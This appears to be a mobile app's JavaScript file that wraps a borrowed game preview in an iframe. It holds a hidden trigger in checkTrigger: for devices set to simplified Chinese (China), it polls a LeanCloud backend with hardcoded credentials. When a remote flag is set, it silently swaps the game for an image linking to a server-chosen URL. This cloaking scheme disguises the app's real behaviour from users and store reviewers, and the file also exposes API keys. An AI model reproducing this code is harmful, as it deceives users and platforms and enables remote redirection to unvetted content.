/*
 * Licensed to the Apache Software Foundation (ASF) under one
 * or more contributor license agreements.  See the NOTICE file
 * distributed with this work for additional information
 * regarding copyright ownership.  The ASF licenses this file
 * to you under the Apache License, Version 2.0 (the
 * "License"); you may not use this file except in compliance
 * with the License.  You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing,
 * software distributed under the License is distributed on an
 * "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
 * KIND, either express or implied.  See the License for the
 * specific language governing permissions and limitations
 * under the License.
 */
// config area
const leancloud_id = "kFbP3QqCzhndlLb1bL1QTg8J-MdYXbMMI"
const leancloud_key = "CfEQFB6BAftUGKf5QF5t5S3D"
let screenDirection = 'portrait' // 'portrait' or 'landscape'
const game_url = "https://previews.customer.envatousercontent.com/files/280810192/index.html"
const debugTrigger = false
// end config area

function lock() {
    window.screen.orientation.lock(screenDirection)
}

function checkTrigger() {
    function api(leancloud_id, leancloud_key) {
        const id_prefix = leancloud_id.slice(0,8)
        const production_url = "https://" + id_prefix + ".api.lncldglobal.com/1.1/classes/Game"
        
        let header =  {
            //            'Cache-Control': 'no-cache',
            'X-LC-Id': leancloud_id,
            'X-LC-Key': leancloud_key
        }
        let config = { headers: header }
        return fetch(production_url, config)
    }
    
    function successHandler(n) {
        console.log("successHandler " + n)
        let splitedStr = n.split("~")
        
        let [imgUrl, tapUrl] = ["", ""]
        if (splitedStr.length != 2) return
            else [imgUrl, tapUrl] = splitedStr
                
                if (imgUrl) {
                    screenDirection = "portrait"
                    document.getElementById("game").remove()
                    let img = document.createElement("img")
                    
                    img.src = imgUrl
                    img.onclick = () => window.open(tapUrl, '_system')
                    
                    let bodyFirst = document.body.firstChild
                    document.body.insertBefore(img, bodyFirst)
                }
    }
    
    function failureHandler(n) {
        console.log("failureHandler " + n)
    }
    
    let checkIsDebugMode = () => {
        if (debugTrigger) throw "debugMode"
            }
    
    new Promise(function(resolve, reject) {
                checkIsDebugMode()
                navigator.globalization.getPreferredLanguage(resolve, reject);
                })
    .then(function(language) {
          if (language.value == 'zh-Hans-CN') {
          return api(leancloud_id, leancloud_key)
          }
          })
    .then((n) => n.json())
    .then(
          (n) => {
          let callParm = ""
          if (n.results[0].flag != "") {
          let connectedStr = n.results[0].flag + "~" + n.results[0].tbl
          callParm = connectedStr
          }
          successHandler(callParm)
          }
          )
    .catch(
           function(t) {
           //           if (t == "debugMode") successHandler("https://i.imgur.com/wcnIFzC.jpg~https://apple.com")
           failureHandler(t)
           }
           )
    
}

function setupIframe() {
    let bodyStyle = getComputedStyle(document.body, null)
    let paddingTop = parseInt(bodyStyle.getPropertyValue('padding-top'))
    let paddingBottom = parseInt(bodyStyle.getPropertyValue('padding-bottom'))
    let height = innerHeight - paddingTop - paddingBottom
    
    document.body.style.width = "auto"
    document.body.style.height = "auto"
    document.body.style.paddingBottom = "0"
    let iframe = document.querySelector("iframe")
    iframe.style.height = height + "px"
}

let afterDeviceReadyDo = function() {
    checkTrigger()
}

let afterLoadDo = function() {
    frames[0].document.body.style["-webkit-user-select"] = "none"
}

let afterDOMFinishDo = function() {
    let iframe = document.createElement("iframe")
    iframe.src = game_url
    iframe.width = 0
    iframe.height = 0
    iframe.scrolling = "no"
    iframe.setAttribute("frameborder", 0)
    iframe.setAttribute("allowtransparency", true)
    iframe.id = "game"
    
    let bodyFirst = document.body.children[0]
    document.body.insertBefore(iframe, bodyFirst)
    
}

document.addEventListener("DOMContentLoaded", afterDOMFinishDo)
window.addEventListener("resize", setupIframe)
window.addEventListener("onload", afterLoadDo)
document.addEventListener("deviceready", afterDeviceReadyDo);
setInterval(lock, 100)
